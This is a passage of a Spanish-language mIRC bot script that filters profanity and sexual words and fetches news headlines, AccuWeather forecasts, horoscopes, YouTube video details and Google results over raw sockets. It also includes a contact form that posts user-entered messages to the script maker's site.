    elseif (%ANTIPALABROTAS.read == $3) { .fclose ANTIPALABROTAS- $+ $2 | return %antipalabrotas.inc }
  }
  .fclose ANTIPALABROTAS- $+ $2
  return false
}
alias coincin.rok {
  unset %coincin.rok.coin %coincin.rok.coin2 %coincin.rok.coin3 %coincin.rok.coin4
  %coincin.rok.coin = 1
  %coincin.rok.coin4 = 1
  while ($mid($1,%coincin.rok.coin,1) != $null) {
    if (%coincin.rok.coin3 != $mid($1,%coincin.rok.coin,1)) || ($mid($1,%coincin.rok.coin,1) == $mid($2,%coincin.rok.coin4,1)) {
      set %coincin.rok.coin2 %coincin.rok.coin2 $+ $mid($1,%coincin.rok.coin,1)
      set %coincin.rok.coin3 $mid($1,%coincin.rok.coin,1) | inc %coincin.rok.coin4
    }
    inc %coincin.rok.coin
  }
  return %coincin.rok.coin2
}
alias ANTIPALABROTAS.add {
  if ($ANTIPALABROTAS.exist(add,$1,$strip($2)) isnum) { return exist }
  else { write %rHcN $+ ANTIPALABROTAS- $+ $1 $+ .txt $strip($2) | return ok }
}
alias ANTIPALABROTAS.del { if ($ANTIPALABROTAS.exist(del,$1,$2) isnum) { write -dl $+ $ifmatch %rHcN $+ ANTIPALABROTAS- $+ $1 $+ .txt | return ok } }
alias ANTISEXO.add {
  if ($ANTISEXO.exist(add,$1,$strip($2)) isnum) { return exist }
  else { write %rHcN $+ ANTISEXO- $+ $1 $+ .txt $strip($2) | return ok }
}
alias ANTISEXO.del { if ($ANTISEXO.exist(del,$1,$2) isnum) { write -dl $+ $ifmatch %rHcN $+ ANTISEXO- $+ $1 $+ .txt | return ok } }
alias ANTISEXO.exist {
  unset %ANTISEXO.inc
  .fopen ANTISEXO- $+ $2 %rHcN $+ ANTISEXO- $+ $2 $+ .txt
  while (!$feof) && (!$ferr) {
    inc %ANTISEXO.inc
    var %ANTISEXO.read $fread(ANTISEXO- $+ $2)
    if ($1 == anti) {
      var %coincin.bsca.anti 1
      while ($gettok($3-,%coincin.bsca.anti,32) != $null) {
        if ($coincin.rok($gettok($3-,%coincin.bsca.anti,32),%ANTISEXO.read) == %ANTISEXO.read) { .fclose ANTISEXO- $+ $2 | return SEXO }
        inc %coincin.bsca.anti
      }
    }
    elseif (%ANTISEXO.read == $3) { .fclose ANTISEXO- $+ $2 | return %ANTISEXO.inc }
  }
  .fclose ANTISEXO- $+ $2
  return false
}
alias meneame.del { meneame.unset | if ($exists(meneame.x) == $true) { if ($fopen(meneame)) { .fclose meneame } | .remove meneame.x } }
alias meneame.unset { unset %mename.item %meneame.title %meneame.link %meneame.link.id %meneame.votes %meneame.nega %meneame.karm %meneame.com }
on *:SOCKOPEN:MENEAME:{
  meneame.del
  if ($sockerr == 0) {
    sockwrite -n $sockname GET /rss HTTP/1.1
    sockwrite -n $sockname Host: meneame.feedsportal.com
    sockwrite -n $sockname Connection: close
    sockwrite -n $sockname Cache-Control: max-age=0
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11
    sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
    sockwrite -n $sockname Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
    sockwrite -n $sockname $crlf
  }
}
on *:SOCKCLOSE:MENEAME:{
  dll %RHDl $+ breaker.dll breakhtml meneame.x
  meneame.unset | .fopen meneame meneame.x
  while (!$feof) && (!$ferr) {
    %meneame = $left($fread(meneame),900)
    if (</item> isin %meneame) {
      if (%meneame.title != $null) && (%meneame.title != %meneame.up) {
        set %meneame.up %meneame.title
        meneame.sy MenÈame en portada: " $+ %meneame.title $+ "
        meneame.sy Votos %meneame.votes $+ , Negativos %meneame.nega $+ , Comentarios %meneame.com $+ , Karma %meneame.karm $+ . 12 $+ %meneame.link.id
      }
      goto e
    }
    if (%mename.item) {
      if (<title>* iswm %meneame) { set %meneame.title $html(%meneame) }
      if (<link>* iswm %meneame) { set %meneame.link $html(%meneame) }
      if (<meneame:link_id>* iswm %meneame) { set %meneame.link.id http://www.meneame.net/go.php?id= $+ $html(%meneame) }
      if (<meneame:votes>* iswm %meneame) { set %meneame.votes $html(%meneame) }
      if (<meneame:negatives>* iswm %meneame) { set %meneame.nega $html(%meneame) }
      if (<meneame:karma>* iswm %meneame) { set %meneame.karm $html(%meneame) }
      if (<meneame:comments>* iswm %meneame) { set %meneame.com $html(%meneame) }
    }
    if (<item> isin %meneame) { meneame.unset | set %mename.item o }
  }
  :e | meneame.del
}
on *:SOCKREAD:MENEAME:{ sockread &MENEAME | bwrite meneame.x -1 &meneame }
on *:SOCKOPEN:ELMUNDO.UH:{
  if ($sockerr == 0) {
    unset %ELMUNDO.TITLE
    sockwrite -n $sockname GET /elmundo/rss/portada.xml HTTP/1.1
    sockwrite -n $sockname Host: elmundo.feedsportal.com
    sockwrite -n $sockname Connection: close
    sockwrite -n $sockname Cache-Control: max-age=0
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11
    sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
    sockwrite -n $sockname $crlf
} }
on *:SOCKREAD:ELMUNDO.UH:{
  sockread %ELMUNDO.UH
  if (<title> isin %ELMUNDO.UH) { set %ELMUNDO.TITLE $gettok($gettok($replace(%ELMUNDO.UH,<title>,$chr(3),</title>,$chr(15)),2,15),2,3) }
  if (href=" isin %ELMUNDO.UH) && (%ELMUNDO.TITLE) {
    if (http://www. isin $gettok($gettok($replace(%ELMUNDO.UH,href=",$chr(15)),2,15),1,34)) && (%ELMUNDO.TITLE != %ELMUNDO.UTITLE) { set %ELMUNDO.UTITLE %ELMUNDO.TITLE | elmundo.sy 1El Mundo: %ELMUNDO.TITLE - $gettok($gettok($replace(%ELMUNDO.UH,href=",$chr(15)),2,15),1,34) }
    sockclose $sockname
  }
}
on *:SOCKOPEN:MNOTICIAS:{
  if ($sockerr == 0) {
    sockwrite -n $sockname GET /ultimahora/index.html HTTP/1.1 | sockwrite -n $sockname Accept: *
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
    sockwrite -n $sockname Host: www.marca.com:80 | sockwrite -n $sockname Connection: Keep-Alive | sockwrite -n $sockname $crlf
  }
}
on *:SOCKREAD:MNOTICIAS:{ sockread %MARCA | if ($remove($mid($html(%MARCA),1,5),:) isnum) && (: isin $mid($html(%MARCA),1,5)) { if (%MNOTICIAS == $mid($html(%MARCA),6,$len(%marca))) { sockclose $sockname | halt } | set %MNOTICIAS $mid($html(%MARCA),6,$len(%marca)) | ancp Noticia en MARCA: $mid($html(%MARCA),6,$len(%marca)) $iif(http:// isin $gettok(%MARCA,2,34),- $gettok(%MARCA,2,34)) | sockclose $sockname } }
alias accuw { inc %accuwi | set %accuw. $+ %accuwi $1 $replace($2-,Ò, $chr(37) $+ C3%B1,$chr(32),+) | sockclose accuw. $+ %accuwi | sockopen accuw. $+ %accuwi www.accuweather.com 80 }
ON *:sockopen:accuw.*:{
  if ($sockerr == 0) {
    if ($gettok(% [ $+ [ $sockname ] ],3,32) != $null) { sockwrite -n $sockname GET $gettok(% [ $+ [ $sockname ] ],3,32) HTTP/1.1 }
    else { sockwrite -n $sockname POST /es/search-locations HTTP/1.1 }
    sockwrite -n $sockname Host: www.accuweather.com
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0
    sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Referer: http://www.accuweather.com/es/es/spain-weather
    sockwrite -n $sockname Connection: close
    if ($gettok(% [ $+ [ $sockname ] ],3,32) == $null) {
      sockwrite -n $sockname Content-Type: application/x-www-form-urlencoded
      var %accuw.var s= $+ $gettok(% [ $+ [ $sockname ] ],2,32) $+ &rn=3day
      sockwrite -n $sockname Content-Length: $len(%accuw.var)
      sockwrite -n $sockname $crlf
      sockwrite -nt $sockname %accuw.var
    }
    sockwrite -n $sockname $crlf
  }
}
ON *:sockread:accuw.*:{
  sockread %accuw | tokenize 32 $left(%accuw,900)
  if ($gettok(% [ $+ [ $sockname ] ],3,32) == $null) {
    if (Location: == $1) { set % $+ $sockname % [ $+ [ $sockname ] ] $replace($2-,weather-,daily-weather-) $+ ?day=1 | var %accuw.skn $sockname | sockclose $sockname | sockopen %accuw.skn www.accuweather.com 80 }
    elseif (<h6><a href="http://www.accuweather.com/ isin $1-) { set % $+ $sockname % [ $+ [ $sockname ] ] $replace($gettok($1-,2,34),weather-,daily-weather-) $+ ?day=1 | var %accuw.skn $sockname | sockclose $sockname | sockopen %accuw.skn www.accuweather.com 80 }
  }
  else {
    if (% [ $+ [ $sockname $+ .tmp.hoy ] ]) {
      if (class="cond"> isin $1-) { set % $+ $sockname $+ .tmp.cond $html($1-) }
      if (class="temp"> isin $1-) { set % $+ $sockname $+ .tmp.temp $remove($html($1-),&deg;,ba,M&#237;n) | unset % [ $+ [ $sockname ] $+ ] .tmp.hoy }
    }
    if (">Hoy</a> isin $1-) { set % $+ $sockname $+ .tmp.hoy o }
    if (realfeel">Precipitaciones isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diapreci == $null) { set % $+ $sockname $+ .tmp.DIApreci $gettok($html($1-),2,32) }
      else { set % $+ $sockname $+ .tmp.NITpreci $gettok($html($1-),2,32) }
    }
    if (style=""> isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaSO == $null) { set % $+ $sockname $+ .tmp.DIASO $html($1-) }
      else { set % $+ $sockname $+ .tmp.NITSO $html($1-) }
    }
    if (R&#225;fagas:< isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaRAFAG == $null) { set % $+ $sockname $+ .tmp.DIARAFAG $html($2-) }
      else { set % $+ $sockname $+ .tmp.NITRAFAG $html($2-) }
    }
    if (ndice UV isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaUV == $null) { set % $+ $sockname $+ .tmp.DIAUV $html($4-) }
      else { set % $+ $sockname $+ .tmp.NITUV $html($4-) }
    }
    if (<li>Tormentas el&#2 isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaTORMELE == $null) { set % $+ $sockname $+ .tmp.DIATORMELE $html($3-) }
      else { set % $+ $sockname $+ .tmp.NITTORMELE $html($3-) }
    }
    if (li>Precipitaciones: isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaPrecipimm == $null) { set % $+ $sockname $+ .tmp.DIAPrecipimm $html($2-) }
      else { set % $+ $sockname $+ .tmp.NITPrecipimm $html($2-) }
    }
    if (<li>Lluvia: isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaLLUVIA == $null) { set % $+ $sockname $+ .tmp.DIALLUVIA $html($2-) }
      else { set % $+ $sockname $+ .tmp.NITLLUVIA $html($2-) }
    }
    if (<li>Nieve: isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaNieve == $null) { set % $+ $sockname $+ .tmp.DIANieve $html($2-) }
      else { set % $+ $sockname $+ .tmp.NITNieve $html($2-) }
    }
    if (<li>Hielo: isin $1-) {
      if (% [ $+ [ $sockname ] $+ ] .tmp.diaHielo == $null) { set % $+ $sockname $+ .tmp.DIAHielo $html($2-) }
      else { set % $+ $sockname $+ .tmp.NITHielo $html($2-) }
    }
    if (<span class="start"> isin $1-) && (% [ $+ [ $sockname ] $+ ] .tmp.diaAman == $null) { set % $+ $sockname $+ .tmp.DIAAman $html($1-) }
    if (<span class="finish"> isin $1-) && (% [ $+ [ $sockname ] $+ ] .tmp.NITAtard == $null) { set % $+ $sockname $+ .tmp.NITAtard $html($1-) }
  }
}
ON *:sockclose:accuw.*:{
  if ($gettok(% [ $+ [ $sockname ] ],3,32) == $null) { msg $gettok(% [ $+ [ $sockname ] ],1,32) No se ha encontrado $replace($gettok(% [ $+ [ $sockname ] ],2,32), $chr(37) $+ C3%B1,Ò,+,$chr(44) $chr(32)) $+ . Introduzca una localidad distinta. }
  else {
    if ($gettok(% [ $+ [ $sockname ] $+ ] .tmp.temp,2,32) == $null) { msg $gettok(% [ $+ [ $sockname ] ],1,32) No se ha encontrado $replace($gettok(% [ $+ [ $sockname ] ],2,32), $chr(37) $+ C3%B1,Ò,+,$chr(44) $chr(32)) $+ . Introduzca una localidad distinta. }
    else { msg $gettok(% [ $+ [ $sockname ] ],1,32) El Tiempo2 $replace($gettok(% [ $+ [ $sockname ] ],2,32), $chr(37) $+ C3%B1,Ò,+,$chr(44) $chr(32)) Estado:2 $html.c(% [ $+ [ $sockname ] $+ ] .tmp.cond) MÌn12 $gettok(% [ $+ [ $sockname ] $+ ] .tmp.temp,2,32) M·x4 $gettok(% [ $+ [ $sockname ] $+ ] .tmp.temp,1,32)  Precipitaciones:2 % [ $+ [ $sockname ] $+ ] .tmp.DIApreci / % [ $+ [ $sockname ] $+ ] .tmp.DIAPrecipimm Vientos:2 % [ $+ [ $sockname ] $+ ] .tmp.DIASO R·fagas:2 % [ $+ [ $sockname ] $+ ] .tmp.DIARAFAG Õndice UV m·x:4 % [ $+ [ $sockname ] $+ ] .tmp.DIAUV Tormentas elÈctricas:12 % [ $+ [ $sockname ] $+ ] .tmp.DIATORMELE Lluvia:2 % [ $+ [ $sockname ] $+ ] .tmp.DIAlluvia Nieve:2 % [ $+ [ $sockname ] $+ ] .tmp.DIANieve Hielo:12 % [ $+ [ $sockname ] $+ ] .tmp.DIAHielo Amanecer: % [ $+ [ $sockname ] $+ ] .tmp.DIAAman Atardecer: % [ $+ [ $sockname ] $+ ] .tmp.NITAtard }
  }
  unset % [ $+ [ $sockname ] ] % [ $+ [ $sockname ] $+ ] .tmp.*
}
alias horoscopo {
  %horoscopod = $iif($2 == Acuario,1) $iif($2 == Aries,2) $iif($2 == Capricornio,3) $iif($replace($2,·,a) == Cancer,4) $iif($replace($2,Û,o) == Escorpion,5) $iif($replace($2,È,e) == Geminis,6) $iif($2 == Leo,7) $iif($2 == Libra,8) $iif($2 == Piscis,9) $iif($2 == Sagitario,10) $iif($2 == Tauro,11) $iif($2 == Virgo,12)
  if (%horoscopod == $null) { msg $1 2ERROR:2 Sintaxis:12 HOROSCOPO Acuario\Aries\Capricornio\C·ncer\EscorpiÛn\GÈminis\Leo\Libra\Piscis\Sagitario\Tauro\Virgo }
  else { sockclose HOROSC. $+ $chr(2) $+ $1 $+ $chr(2) $+ %horoscopod | sockopen HOROSC. $+ $chr(2) $+ $1 $+ $chr(2) $+ %horoscopod servicios.aol.com 80 }
}
on *:SOCKOPEN:HOROSC.*:{
  if ($sockerr > 0) { msg $gettok($sockname,2,2) 2Horoscopo2 Error al conectar. }
  else {
    unset %HOROSC.*
    sockwrite -n $sockname GET /content/astrologia/horoscopos-2009/signos/signo.php?Domain=http://tuvida.aol.com/&Signo= $+ $gettok($sockname,3,2) HTTP/1.0
    sockwrite -n $sockname Accept: *
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
    sockwrite -n $sockname Host: servicios.aol.com:80 | sockwrite -n $sockname Connection: Keep-Alive | sockwrite -n $sockname $crlf
} }
on *:SOCKREAD:HOROSC.*:{
  sockread %HOROSC
  if (<td><strong> isin $gettok(%HOROSC,1,32)) && ($gettok($html(%HOROSC),1,32) isnum) && ($gettok($html(%HOROSC),2,32) !isnum) && ($gettok($html(%HOROSC),3,32) !isnum) && ($gettok($html(%HOROSC),5,32) isnum) { %HOROSC.2 = $html(%HOROSC) }
  elseif (%HOROSC.2) { %HOROSC.3 = $html(%HOROSC) | unset %HOROSC.2 }
  if (/images/stars/ isin %HOROSC) && (.gif isin %HOROSC) && (%HOROSC.salud == $null) { %HOROSC.salud = $remove($gettok($gettok($gettok(%HOROSC,4,47),1,34),1,46),0) | halt }
  if (/images/stars/ isin %HOROSC) && (.gif isin %HOROSC) && (%HOROSC.dinero == $null) { %HOROSC.dinero = $remove($gettok($gettok($gettok(%HOROSC,4,47),1,34),1,46),0) | halt }
  if (/images/stars/ isin %HOROSC) && (.gif isin %HOROSC) && (%HOROSC.amor == $null) { %HOROSC.amor = $remove($gettok($gettok($gettok(%HOROSC,4,47),1,34),1,46),0) | halt }
  if (/images/stars/ isin %HOROSC) && (.gif isin %HOROSC) && (%HOROSC.familia == $null) { %HOROSC.familia = $remove($gettok($gettok($gettok(%HOROSC,4,47),1,34),1,46),0) }
  if (mero de la suerte: <strong> isin %HOROSC) { %HOROSC.NS = $remove($html(%HOROSC),N˙mero de la suerte:) }
  if (<td>Color de hoy: <strong> isin %HOROSC) { %HOROSC.CDH = $remove($html(%HOROSC),Color de hoy:) }
  if (<td>Sorpresa: <strong> isin %HOROSC) { %HOROSC.SORP = $remove($html(%HOROSC),Sorpresa:) }
  if (<td><span class="amuletotitulo"> isin %HOROSC) {
    ;%HOROSC.AMUL = $remove($html(%HOROSC),Amuleto del dÌa:)
    horoscopo.send $sockname | sockclose $sockname
  }
  ;  elseif (%HOROSC.AMUL) { %HOROSC.AMUL2 = $html(%HOROSC) | horoscopo.send $sockname | sockclose $sockname }
}
alias horoscopo.send {
  tokenize 2 $1
  %horoscopod = $iif($3 == 1,Acuario) $iif($3 == 2,Aries) $iif($3 == 3,Capricornio) $iif($3 == 4,C·ncer) $iif($3 == 5,EscorpiÛn) $iif($3 == 6,GÈminis) $iif($3 == 7,Leo) $iif($3 == 8,Libra) $iif($3 == 9,Piscis) $iif($3 == 10,Sagitario) $iif($3 == 11,Tauro) $iif($3 == 12,Virgo)
  if (%horoscopod) {
    msg $2 12 $+ %horoscopod 2Salud: $horoscopo.glob(3,%HOROSC.salud) 2Dinero: $horoscopo.glob(8,%HOROSC.dinero) 2Amor: $horoscopo.glob(4,%HOROSC.amor) 2Familia: $horoscopo.glob(12,%HOROSC.Familia) 2N˙mero de la suerte:12 $iif(%HOROSC.NS,%HOROSC.NS,N.E) 2Color:12 $iif(%HOROSC.CDH,%HOROSC.CDH,N.E) 2Sorpresa:12 $iif(%HOROSC.SORP,%HOROSC.SORP,N.E)
    if ($horoscopo.carac(%horoscopod) != $null) { msg $2 12 $+ %horoscopod 2CaracterÌsticas:2 $ifmatch }
    ;    msg $2 12 $+ %horoscopod 2Amuleto del dÌa:12 $iif(%HOROSC.AMUL,%HOROSC.AMUL,N.E) $+ 2 %HOROSC.AMUL2
    msg $2 12 $+ %horoscopod 2Mensaje:2 $iif(%HOROSC.3,%HOROSC.3,N.E)
} }
alias horoscopo.glob {
  if ($2) {
    if ($2- == 0) || ($2- == $null) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
    if ($2- == 1) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
    if ($2- == 2) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
    if ($2- == 3) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
    if ($2- == 4) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
    if ($2- == 5) { %horoscopo.glob =  $+ $1 $+ ***** | return %horoscopo.glob }
  }
  return
}
alias horoscopo.carac {
  if ($1 == Acuario) { return Signo de aire. Son voluntariosos, trabajadores, idealistas y conquistadores. Desde muy jÛvenes saben muy bien, lo que quieren y como lo quieren. Ordenados, mandones y disciplinados. Sus golpes de car·cter y enfados no son habituales, pero son dr·sticos y sorprendentes. }
  if ($1 == Piscis) { return Signo de agua. Amables, confiados, generosos, a veces melancÛlicos, sinceros, comprensivos. Se adaptan a situaciones complicadas. Amante de tradiciones saben valorar como nadie, la familia y la amistad. Son lentos a la hora de tomar una decisiÛn. }
  if ($1 == Aries) { return Signo de fuego, regido por Marte son sinceros, idealistas, ambiciosos, dominantes y apasionados. Necesitan estar siempre muy activos. No soportan que nadie les ordene o manipule aunque les encanta ser organizadores. Les gusta conquistar, seducir y enamorar. }
  if ($1 == Tauro) { return Signo de tierra, dominado por Venus, son muy laboriosos, pr·cticos, y muy tenaces por conseguir lo que se proponen. Amantes de los retos. Amantes del hogar y de la familia a la que defender·n siempre. Son muy posesivos, celosos, desconfiados y testarudos. }
  if ($1 == GÈminis) { return Signo de aire, marcado por Mercurio, personas armoniosas, temperamentales, muy nerviosos, humanos, cautivadores, enigm·ticos y muy cerebrales. Defensores de la lealtad. Son atentos, cariÒosos y detallistas, aunque un poco interesados. Su orgullo les pierde. }
  if ($1 == C·ncer) { return Signo de agua. Son amorosos, sensuales, a veces incomprendidos, extravagantes, un poco histÈricos, sensibles, y algo mani·ticos. Son confiados, enamoradizos, inquietos y muy interesados. Necesitan sentirse el centro de la familia y de cualquiera reuniÛn. }
  if ($1 == Leo) { return Signo de fuego con la notable influencia del Sol que les hace ser personas brillantes a los que les gusta no pasar inadvertidos. Son cariÒosos, protectores, seductores y con mucha fuerza de voluntad. Grandes anfitriones. Respetuosos, educados, saben disimular como nadie. }
  if ($1 == Virgo) { return Signo de tierra. Son estudiosos y luchar·n por el poder y la ambiciÛn econÛmica. Son impulsivos, decididos y por encima de todo salen siempre con la suya. Desde muy jÛvenes se aislaron de la familia y les gusta la independencia. Nadie consigue llegarlos a conocer. }
  if ($1 == Libra) { return Signo de aire. Son personas cordiales, abiertas, sinceras y leales. Tienen car·cter, son un poco volubles y lun·ticos, pero sus sueÒos siempre los consiguen con mucho tesÛn y voluntad. Son cÛmodos, hogareÒos y les gusta conocer lugares exÛticos. Siempre est·n ideando cambios. }
  if ($1 == Escorpio) { return Signo de agua. Son estudiosos, leales, decididos, no ven el peligro de nada y pueden ser obstinados para conseguir sus metas. Son soberbios, orgullosos, un poco dÈspotas y muy educados. No perdonan la traiciÛn ni la falta de lealtad. Son honrados, formales. }
  if ($1 == Sagitario) { return Signo de Fuego. Car·cter enÈrgico, luchador, astuto, fiel, vanidoso, impetuosos y muy temperamental. Son muy trabajadores y tienen la astucia de rodearse de gente que les ayuden a triunfar. Son responsables y muy honrados. Pueden ser algo tiernos y rom·nticos. }
  if ($1 == Capricornio) { return Signo de tierra dominado por Saturno. Capricornio es un signo ambicioso, determinado, frÌo, melancÛlico y conservador. Es un individuo muy trabajador que impone el sacrificio por encima de casi todo. Son pacientes y pueden determinar exactamente donde estar·n a un mes de distancia, se proponen metas y las logran. }
}
on *:SOCKOPEN:youtube.*:{
  if ($sockerr > 0) { .msg $gettok($gettok($1,2,46),1,2) 1You0,4TUBE 2Fallo en la conexiÛn. }
  else {
    unset %temp. $+ $sockname %temp2. $+ $sockname %temp3. $+ $sockname
    sockwrite -n $sockname GET $gettok($gettok($sockname,2,46),3,2) HTTP/1.0
    sockwrite -n $sockname Accept: *
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
    sockwrite -n $sockname Host: www.youtube.com:80 | sockwrite -n $sockname Connection: close | sockwrite -n $sockname $crlf
  }
}
on *:SOCKREAD:youtube.*:{
  sockread %youtube
  tokenize 32 $left(%youtube,900)
  if (Location: == $1) { youtube.exalink $gettok($gettok($sockname,2,46),1,2) $gettok($gettok($sockname,2,46),2,2) $2 | sockclose $sockname }
  if (<title> isin $1-) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] $left($html.c($mid($left($1-, $calc($pos($1-,</title> ,1) - 1)),$calc($pos($1-,<title>,1) + 7) ,$len($1-))),-9) }
  if ("length_seconds": isin %youtube) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] 2DuraciÛn12 $pn00($duration($remove($gettok($gettok($mid(%youtube,$pos(%youtube,"length_seconds":,1),-1),2,58),1,44),$chr(32)))) }
  if (<span class="watch-view-count"> isin $1-) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] 2Visto:12 $nump($gettok($html($1-),1,32)) }
  if (data-name="watch"> isin $1-) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] 2Autor12 $gettok($gettok($html($1-),1,38),1,32) }
  if (<p id="watch-uploader-info"> isin $1-) { set %temp3. $+ $sockname o }
  elseif (%temp3. [ $+ [ $sockname ] ]) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] 2Fecha12 $gettok($html($1-),$gettok($html($1-),0,32),32) | unset %temp3. $+ $sockname }
  if (class="watch-view-count" isin $1-) { set %temp2. $+ $sockname o }
  elseif (%temp2. [ $+ [ $sockname ] ]) { if ($html($1-) isnum) { set %temp. $+ $sockname %temp. [ $+ [ $sockname ] ] 2Visto12 $nump($html($1-)) } | unset %temp2. $+ $sockname }
}
on *:SOCKCLOSE:youtube.*:{ if (%temp. [ $+ [ $sockname ] ] == $null) { msg $gettok($gettok($sockname,2,46),1,2) 1You0,4TUBE 2El enlace 12www.youtube.com $+ $gettok($gettok($sockname,2,46),3,2) $+ 2 no existe. } | else { msg $gettok($gettok($sockname,2,46),1,2) 1You0,4TUBE 2Enlace 12www.youtube.com $+ $gettok($gettok($sockname,2,46),3,2) $+  %temp. [ $+ [ $sockname ] ] } | unset %temp. $+ $sockname %temp2. $+ $sockname %temp3. $+ $sockname }
alias youtube.exalink {
  %youtube.tem = $1 $+ $chr(2) $+ $2 $+ $chr(2) $+ $replace(/ $+ $gettok($remove($gettok($3,1,38),http:,//),2-,47),/v/,/watch?v=) $+ $chr(2) $+ $r(1000000,9999999)
  sockclose youtube. $+ %youtube.tem | sockopen youtube. $+ %youtube.tem www.youtube.com 80
}
alias nump {
  %numpunt5 = $remove($1,.)
  if (%numpunt5 isnum) {
    unset %numpunt2 %numpunt3 %numpunt4 | %numpunt = 1
    while (%numpunt <= $len(%numpunt5)) { if (%numpunt2 == 3) { set %numpunt3 . $+ %numpunt4 $+ %numpunt3 | unset %numpunt4 | dec %numpunt2 3 } | set %numpunt4 $left($right(%numpunt5,%numpunt),1) $+ %numpunt4 | inc %numpunt2 | inc %numpunt }
    %numpunt6 = $left(%numpunt5,%numpunt2) $+ %numpunt3 | return %numpunt6
} }
ON *:sockopen:contacto.*:{
  if ( $sockerr > 0 ) { unset %contacto.n2 | set %sndmel f | .timerbrvacn2 1 4 unset %sndmel | datv-contacto | return }
  sockwrite -n $sockname POST /mc-services/megabot/3.7/megabotmail.php HTTP/1.1
  sockwrite -n $sockname Host: www.maincenter.es
  sockwrite -n $sockname Connection: keep-alive
  var %contacto.var = nombre= $+ $iif(%contacto.n2,%contacto.n2,%contacto.n) $+ &asunto= $+ %contacto.a $+ &email= $+ %contacto.e $+ &mensaje= $+ %contacto.m $crlf
  sockwrite -n $sockname Content-Length: $len(%contacto.var)
  sockwrite -n $sockname Cache-Control: max-age=0
  sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  sockwrite -n $sockname Origin: http://maincenter.es
  sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36
  sockwrite -n $sockname Content-Type: application/x-www-form-urlencoded
  sockwrite -n $sockname Referer: http://www.maincenter.es
  sockwrite -n $sockname Accept-Encoding: deflate
  sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
  sockwrite -n $sockname $crlf
  sockwrite -nt $sockname %contacto.var
  unset %contacto.n2
}
ON *:sockread:contacto.*:{ sockread %sock | if (<p>TRUE</p> isin %sock) { clear @dcont | unset %contacto.m %contacto.a | .timerbrvacn 1 4 unset %sndmel | set %ccont 1 | set %sndmel o | datv-contacto | sockclose $sockname } }
ON *:sockclose:contacto.*:{ .timerbrvacn 1 4 unset %sndmel | set %sndmel f | datv-contacto }
ON *:sockopen:google.*: {
  if ( $sockerr > 0 ) { .msg gettok($gettok($1,2,46),1,2) 12G4o8o12g3l4e2 Fallo en la conexiÛn. }
  else {
    sockwrite -n $sockname GET /search?q= $+ $+ $gettok($gettok($sockname,2,46),3,2) $+ %22&hl=es&biw=1440&bih=791&num=10&lr=&ft=i&cr=&safe=images HTTP/1.0
    sockwrite -n $sockname Host: www.google.com:80
    sockwrite -n $sockname Connection: close
    sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30
    sockwrite -n $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    sockwrite -n $sockname Accept-Encoding: deflate
    sockwrite -n $sockname Accept-Language: es-ES,es;q=0.8
    sockwrite -n $sockname Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
    sockwrite -n $sockname $crlf
  }
}
on *:SOCKREAD:google.*:{ sockread &google | bwrite google $+ $gettok($gettok($sockname,2,46),4,2) $+ .x -1 &google | .timergoogle $+ $gettok($gettok($sockname,2,46),4,2) 1 1 google.troz $sockname }
alias google.troz { dll %RHDl $+ breaker.dll breakhtml google $+ $gettok($gettok($1,2,46),4,2) $+ .x | .timergoogle $+ $gettok($gettok($1,2,46),4,2) 1 1 lee.google $1 }
alias lee.google {
